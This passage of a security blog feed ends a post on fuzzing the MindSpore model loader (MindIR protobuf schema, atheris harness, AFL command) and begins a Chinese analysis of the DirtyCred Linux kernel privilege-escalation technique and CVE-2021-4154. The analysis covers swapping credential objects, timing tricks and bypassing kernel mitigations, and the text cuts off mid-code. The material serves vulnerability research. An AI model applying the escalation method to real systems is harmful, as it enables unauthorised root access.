class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto2&quot;</span>;<br><span class="hljs-keyword">package</span> mind_ir;<br><br><span class="hljs-keyword">enum </span><span class="hljs-title class_">Version</span> &#123;<br>  IR_VERSION_START = <span class="hljs-number">0</span>;<br>  IR_VERSION = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">AttributeProto</span> &#123;<br>  <span class="hljs-keyword">enum </span><span class="hljs-title class_">AttributeType</span> &#123;<br>    UNDEFINED = <span class="hljs-number">0</span>;<br>    FLOAT = <span class="hljs-number">1</span>;<br>    UINT8 = <span class="hljs-number">2</span>;<br>    INT8 = <span class="hljs-number">3</span>;<br>    UINT16 = <span class="hljs-number">4</span>;<br>    INT16 = <span class="hljs-number">5</span>;<br>    INT32 = <span class="hljs-number">6</span>;<br>    INT64 = <span class="hljs-number">7</span>;<br>    STRING = <span class="hljs-number">8</span>;<br>    BOOL = <span class="hljs-number">9</span>;<br>    FLOAT16 = <span class="hljs-number">10</span>;<br>    DOUBLE = <span class="hljs-number">11</span>;<br>    UINT32 = <span class="hljs-number">12</span>;<br>    UINT64 = <span class="hljs-number">13</span>;<br>    COMPLEX64 = <span class="hljs-number">14</span>;<br>    COMPLEX128 = <span class="hljs-number">15</span>;<br>    BFLOAT16 = <span class="hljs-number">16</span>;<br>    TENSOR = <span class="hljs-number">17</span>;<br>    GRAPH = <span class="hljs-number">18</span>;<br>    TENSORS = <span class="hljs-number">19</span>;<br>    TUPLE = <span class="hljs-number">20</span>;        <span class="hljs-comment">// tuple</span><br>    LIST = <span class="hljs-number">21</span>;         <span class="hljs-comment">// list</span><br>    DICT = <span class="hljs-number">22</span>;         <span class="hljs-comment">// dictionary</span><br>    UMONAD = <span class="hljs-number">23</span>;<br>    IOMONAD = <span class="hljs-number">24</span>;<br>    NONE = <span class="hljs-number">25</span>;<br>    PRIMITIVECLOSURE = <span class="hljs-number">26</span>;<br>    FUNCGRAPHCLOSURE = <span class="hljs-number">27</span>;<br>    PARTIALCLOSURE = <span class="hljs-number">28</span>;<br>    UNIONFUNCCLOSURE = <span class="hljs-number">29</span>;<br>    CSR_TENSOR = <span class="hljs-number">30</span>;<br>    COO_TENSOR = <span class="hljs-number">31</span>;<br>    ROW_TENSOR = <span class="hljs-number">32</span>;<br>    CLASS_TYPE = <span class="hljs-number">33</span>;<br>    NAME_SPACE = <span class="hljs-number">34</span>;<br>    SYMBOL = <span class="hljs-number">35</span>;<br>    TYPE_NULL = <span class="hljs-number">36</span>;<br>    MAP_TENSOR = <span class="hljs-number">37</span>;<br>    FUNCTOR = <span class="hljs-number">38</span>;<br>    SCALAR = <span class="hljs-number">39</span>;<br>  &#125;<br>  <span class="hljs-keyword">message </span><span class="hljs-title class_">SeqInfoProto</span>&#123;<br>    <span class="hljs-keyword">optional</span> <span class="hljs-type">bool</span> is_dyn_len = <span class="hljs-number">1</span>;                 <span class="hljs-comment">// store if tuple is dynamic length</span><br>    <span class="hljs-keyword">optional</span> AttributeProto tuple_elem_item = <span class="hljs-number">2</span>;  <span class="hljs-comment">// store the element of tuple dynamic length</span><br>  &#125;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">float</span> f = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">int64</span> i = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">double</span> d = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">bytes</span> s = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">optional</span> TensorProto t = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> GraphProto g = <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">float</span> floats = <span class="hljs-number">8</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">double</span> doubles = <span class="hljs-number">9</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> ints = <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">bytes</span> strings = <span class="hljs-number">11</span>;<br>  <span class="hljs-keyword">repeated</span> TensorProto tensors = <span class="hljs-number">12</span>;<br>  <span class="hljs-keyword">repeated</span> GraphProto graphs = <span class="hljs-number">13</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">14</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> ref_attr_name = <span class="hljs-number">15</span>;<br>  <span class="hljs-keyword">optional</span> AttributeType type = <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto values = <span class="hljs-number">17</span>;          <span class="hljs-comment">// tuple, list, dict of value</span><br>  <span class="hljs-keyword">optional</span> SeqInfoProto seq_info = <span class="hljs-number">18</span>;       <span class="hljs-comment">// tuple, list, structural info</span><br>  <span class="hljs-keyword">optional</span> FunctorProto functor = <span class="hljs-number">19</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">FunctorProto</span> &#123;<br>  <span class="hljs-keyword">enum </span><span class="hljs-title class_">FunctorType</span> &#123;<br>    SHAPE_CALC_FUNCTOR = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">optional</span> FunctorType type = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto values = <span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ValueInfoProto</span> &#123;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">repeated</span> TensorProto tensor = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> denotation = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">optional</span> AttributeProto attr_info = <span class="hljs-number">5</span>; <span class="hljs-comment">// graph input info for other type</span><br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">NodeProto</span> &#123;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">string</span> input = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">string</span> output = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> op_type = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto attribute = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> domain = <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto node_attr = <span class="hljs-number">8</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto primal_attr = <span class="hljs-number">9</span>;<br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ModelProto</span> &#123;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> ir_version = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> producer_name = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> producer_version = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> domain = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> model_version = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> GraphProto graph = <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">repeated</span> GraphProto functions = <span class="hljs-number">8</span>; <span class="hljs-comment">// all the graphs without the main graph.</span><br>  <span class="hljs-keyword">optional</span> PreprocessorProto preprocessor = <span class="hljs-number">9</span>;  <span class="hljs-comment">// data graph from MindData.</span><br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">bool</span> little_endian = <span class="hljs-number">10</span>; <span class="hljs-comment">// bytes order in load device.</span><br>  <span class="hljs-keyword">optional</span> ParallelProto parallel = <span class="hljs-number">11</span>; <span class="hljs-comment">// information for parallel.</span><br>  <span class="hljs-keyword">repeated</span> PrimitiveProto primitives = <span class="hljs-number">12</span>; <span class="hljs-comment">// all the primitives of the model.</span><br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">int64</span> mind_ir_version = <span class="hljs-number">13</span>;<br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PreprocessorProto</span> &#123;<br>  <span class="hljs-keyword">repeated</span> PreprocessOpProto op = <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PreprocessOpProto</span> &#123;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> input_columns = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> output_columns = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> project_columns = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> op_type = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> operations = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">bool</span> offload = <span class="hljs-number">6</span>;<br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">GraphProto</span> &#123;<br>  <span class="hljs-keyword">repeated</span> NodeProto node = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">repeated</span> TensorProto parameter = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">repeated</span> ValueInfoProto input = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">repeated</span> ValueInfoProto output = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> bprop_hash = <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto attribute = <span class="hljs-number">8</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> bprop_filepath = <span class="hljs-number">9</span>;<br>  <span class="hljs-keyword">repeated</span> MapTensorProto map_parameter = <span class="hljs-number">10</span>;<br>&#125;<br><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">TensorProto</span> &#123;<br>  <span class="hljs-keyword">enum </span><span class="hljs-title class_">DataType</span> &#123;<br>    UNDEFINED = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// Basic types.</span><br>    FLOAT = <span class="hljs-number">1</span>;   <span class="hljs-comment">// float</span><br>    UINT8 = <span class="hljs-number">2</span>;   <span class="hljs-comment">// uint8_t</span><br>    INT8 = <span class="hljs-number">3</span>;    <span class="hljs-comment">// int8_t</span><br>    UINT16 = <span class="hljs-number">4</span>;  <span class="hljs-comment">// uint16_t</span><br>    INT16 = <span class="hljs-number">5</span>;   <span class="hljs-comment">// int16_t</span><br>    INT32 = <span class="hljs-number">6</span>;   <span class="hljs-comment">// int32_t</span><br>    INT64 = <span class="hljs-number">7</span>;   <span class="hljs-comment">// int64_t</span><br>    STRING = <span class="hljs-number">8</span>;  <span class="hljs-comment">// string</span><br>    BOOL = <span class="hljs-number">9</span>;    <span class="hljs-comment">// bool</span><br>    FLOAT16 = <span class="hljs-number">10</span>;<br>    DOUBLE = <span class="hljs-number">11</span>;<br>    UINT32 = <span class="hljs-number">12</span>;<br>    UINT64 = <span class="hljs-number">13</span>;<br>    COMPLEX64 = <span class="hljs-number">14</span>;<br>    COMPLEX128 = <span class="hljs-number">15</span>;<br>    BFLOAT16 = <span class="hljs-number">16</span>;<br>    FLOAT64 = <span class="hljs-number">17</span>;<br>  &#125;<br>  <span class="hljs-keyword">enum </span><span class="hljs-title class_">CompressionType</span> &#123;<br>    NO_COMPRESSION = <span class="hljs-number">0</span>;<br>    INDEXING = <span class="hljs-number">1</span>;<br>    SPARSE = <span class="hljs-number">2</span>;<br>    FSE = <span class="hljs-number">3</span>;<br>    BIT_PACKING = <span class="hljs-number">4</span>;<br>    FSE_INT = <span class="hljs-number">5</span>;<br>    FSE_INFER = <span class="hljs-number">6</span>;<br>  &#125;<br>  <span class="hljs-keyword">message </span><span class="hljs-title class_">ExternalDataProto</span> &#123;<br>    <span class="hljs-comment">//POSIX filesystem path relative to the directory where the MindIR model was stored.</span><br>    <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> location = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">optional</span> <span class="hljs-type">int64</span> offset = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">optional</span> <span class="hljs-type">int64</span> length = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> checksum = <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">message </span><span class="hljs-title class_">QuantParamProto</span> &#123;<br>    <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> quant_algo_name = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">repeated</span> AttributeProto attribute = <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> dims = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">int32</span> data_type = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">float</span> float_data = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int32</span> int32_data = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">bytes</span> string_data = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> int64_data = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> doc_string = <span class="hljs-number">8</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">bytes</span> raw_data = <span class="hljs-number">9</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">double</span> double_data = <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">uint64</span> uint64_data = <span class="hljs-number">11</span>;<br>  <span class="hljs-keyword">optional</span> ExternalDataProto external_data = <span class="hljs-number">12</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> ref_key = <span class="hljs-number">13</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> min_dims = <span class="hljs-number">14</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> max_dims = <span class="hljs-number">15</span>;<br>  <span class="hljs-keyword">optional</span> CompressionType compression_type = <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">repeated</span> QuantParamProto quant_params = <span class="hljs-number">17</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">MapTensorProto</span> &#123;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">required</span> AttributeProto default_value = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">required</span> TensorProto key_tensor = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">required</span> TensorProto value_tensor = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">required</span> TensorProto status_tensor = <span class="hljs-number">5</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ParallelProto</span> &#123;<br>  <span class="hljs-keyword">repeated</span> LayoutProto layout = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">LayoutProto</span> &#123;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> device_arrangement_int = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> tensor_map_int = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">repeated</span> <span class="hljs-type">int64</span> slice_shape_int = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">int64</span> field_size = <span class="hljs-number">5</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">bool</span> uniform_split = <span class="hljs-number">6</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> opt_shard_group = <span class="hljs-number">7</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PrimitiveProto</span> &#123;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> op_type = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">repeated</span> AttributeProto attribute = <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> instance_name = <span class="hljs-number">4</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4id="使用libprotobuf-mutator辅助测试">使用Libprotobuf-mutator辅助测试</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;This is a Python API fuzzer template with protobuf for mindspore.load&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> atheris<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">import</span> atheris_libprotobuf_mutator<br><br><span class="hljs-keyword">import</span> mind_ir<br><br><span class="hljs-keyword">with</span> atheris.instrument_imports():<br>  <span class="hljs-keyword">import</span> mindspore <span class="hljs-keyword">as</span> ms<br><br>_DEFAULT_FILENAME = <span class="hljs-string">&#x27;/tmp/test.mindir&#x27;</span><br><br><span class="hljs-meta">@atheris.instrument_func</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TestOneProtoInput</span>(<span class="hljs-params">data</span>):<br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(_DEFAULT_FILENAME,mode=<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data.SerializeAsString())<br>  <span class="hljs-keyword">try</span>:<br>    _ = ms.load(filename = _DEFAULT_FILENAME)<br>  <span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  atheris_libprotobuf_mutator.Setup(<br>      sys.argv, TestOneProtoInput, proto=mind_ir.ModelProto)<br>  atheris.Fuzz()<br></code></pre></td></tr></table></figure><p>atheris的命令行参数与libfuzzer一致，参照官方文档配置即可。</p><h2 id="使用afl对端侧推理框架测试">使用AFL对端侧推理框架测试</h2><p>配置环境变量，以converter为例进行fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=<span class="hljs-variable">$PWD</span>/output/tmp/mindspore-lite-2.1.0-linux-x64/runtime/lib:<span class="hljs-variable">$PWD</span>/output/tmp/mindspore-lite-2.1.0-linux-x64/tools/converter/lib<br><br>afl-fuzz -i mindir_corpus -o outdir -- ./output/tmp/mindspore-lite-2.1.0-linux-x64/tools/converter/converter/converter_lite --fmk=MINDIR --modelFile=@@ --outputFile=/dev/null<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LLM Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLM Security</tag>
      
      <tag>Threat Analysis</tag>
      
      <tag>Fuzzing</tag>
      
      <tag>MindSpore</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DirtyCred与CVE-2021-4154漏洞分析</title>
    <link href="/2022/10/08/DirtyCred/"/>
    <url>/2022/10/08/DirtyCred/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识">基础知识</h1><p>DirtyCred通过利用堆破坏内核漏洞，交换进程或文件的非特权和特权凭据，实现越权执行或写入操作。该技术能够绕过包括KASLR、CFI、SMEP/SMAP以及KPTI在内的多种内核保护机制和漏洞缓解措施。</p><p>具体到实现上，DirtyCred需要对已知内核漏洞的利用功能进行转向，以便对凭据对象进行交换，这一过程取决于不同类型的漏洞在内存损坏中所能提供的不同功能。此外，DirtyCred必须严格控制对象交换发生的时间窗口。由于可利用的时间窗口极为短暂，若没有有效的机制延长此时间窗口，漏洞利用的稳定性将受到影响。第三，DirtyCred需要找到一种机制，使得无特权用户能够主动地分配特权凭证，因为缺乏这种能力会阻碍主动触发凭证对象的交换，从而影响漏洞的利用。</p><p>为了达到这一目的，DirtyCred将任何基于堆的漏洞转变为能够以无效方式释放凭据对象的能力，并结合使用userfaultfd、FUSE和文件锁等三种不同的内核特性，以延长对象交换所需的时间窗口，实现稳定的漏洞利用。同时，DirtyCred还利用了各种内核机制，从用户空间和内核空间生成高特权线程，主动分配特权对象。</p><h2 id="credentials-in-linux-kernel">Credentials in Linux kernel</h2><p>在Linux内核中，<ahref="https://www.kernel.org/doc/Documentation/security/credentials.txt">Credentials</a>代表一系列包含特权信息的内核属性，这些属性使得Linux内核能够根据用户的权限来执行访问控制。Credentials在Linux内核中是作为携带特权信息的内核对象来实现的，这些对象主要包括<code>cred</code>、<code>file</code>和<code>inode</code>对象。鉴于<code>inode</code>对象仅在文件系统上创建新文件时分配，它提供的利用空间不足以支持内存操作（成功利用漏洞的关键步骤），因此，漏洞利用主要集中在<code>cred</code>和<code>file</code>对象上。</p><ol type="1"><li><p><strong><code>struct cred</code></strong>对象存储了进程的权限信息，如GID、UID等。通过修改低权限进程的<code>cred</code>结构体，可以将进程提升至高权限（如root）。</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/cred.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br> <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br> <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br> <span class="hljs-type">void</span>        *put_addr;<br> <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC   0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br> <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br> <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_permitted;   <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_effective;   <span class="hljs-comment">/* caps we can actually use */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_bset;        <span class="hljs-comment">/* capability bounding set */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_ambient;     <span class="hljs-comment">/* Ambient capability set */</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></p></li><li><p><strong><code>struct file</code></strong>对象包含了文件的部分权限信息，如读写权限等。如果低权限用户能够修改高权限文件（如<code>/etc/passwd</code>），同样可以实现提权。</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 